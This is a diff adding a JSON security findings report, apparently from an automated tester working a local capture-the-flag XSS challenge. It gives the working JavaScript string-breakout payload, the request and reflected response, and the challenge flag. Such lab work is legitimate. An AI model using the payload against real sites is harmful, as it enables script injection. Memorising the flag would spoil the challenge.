@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T01:02:42.187553+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "e87f52a6-e038-43fb-a5fa-2b83b657b9da",
+      "timestamp": "2026-04-13T01:02:42.187391+00:00",
+      "title": "Reflected XSS in JavaScript String Context via 'name' Parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:50197/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter directly into a JavaScript string assignment without sanitization: `var name = \"USER_INPUT\";`. By injecting `\";alert('XSS')//`, an attacker breaks out of the string literal and executes arbitrary JavaScript. The server-side validation confirms successful exploitation by returning the CTF flag.",
+      "evidence": "Request: GET /page?name=%22%3Balert(%27XSS%27)%2F%2F\n\nReflected payload in response:\n<script> var name = \"\";alert('XSS')//\"; document.write('Hello ' + name); </script>\n\nServer response: Congratulations! Here is the flag: flag{9d55bbc2-90fa-40d4-89cd-c6c7a57915eb}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:50197/page?name=%22%3Balert(%27XSS%27)%2F%2F",
+        "expected": "JavaScript alert('XSS') executes; page shows congratulations with flag{9d55bbc2-90fa-40d4-89cd-c6c7a57915eb}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "7fcf0de5-3c6b-4844-b9dd-7a70486899a1",
+      "timestamp": "2026-04-13T01:02:50.835711+00:00",
+      "title": "Dalgona CTF Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Attacker)\"] --> Home[\"GET / - Dalgona Challenges Home\"]\n  Home --> Page[\"GET /page - XSS Challenge\"]\n  Page --> JS[\"JavaScript: var name = USER_INPUT\"]\n  JS --> Reflect[\"Reflected XSS in JS String Context\"]\n  Reflect --> Flag[\"Flag: flag{9d55bbc2-90fa-40d4-89cd-c6c7a57915eb}\"]\n  Page --> Static[\"Static Assets /static/css/xss/xss6.css\"]\n  Server[\"Flask/Werkzeug 3.1.8 Python 3.11.15\"] --> Page\n  Server --> Home"
+    }
+  ]
+}
